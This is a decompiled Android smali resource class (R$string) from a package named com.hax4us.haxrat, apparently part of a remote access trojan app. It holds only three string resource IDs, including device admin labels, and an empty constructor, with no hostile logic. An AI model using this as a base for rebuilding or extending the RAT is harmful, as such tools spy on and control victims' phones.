.class public final Lcom/hax4us/haxrat/R$string;
.super Ljava/lang/Object;
.source "R.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/R;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x39
    name = "string"
.end annotation


# static fields
.field public static final app_name:I = 0x7f070000

.field public static final device_admin_label:I = 0x7f070001

.field public static final device_description:I = 0x7f070002


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 40
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method
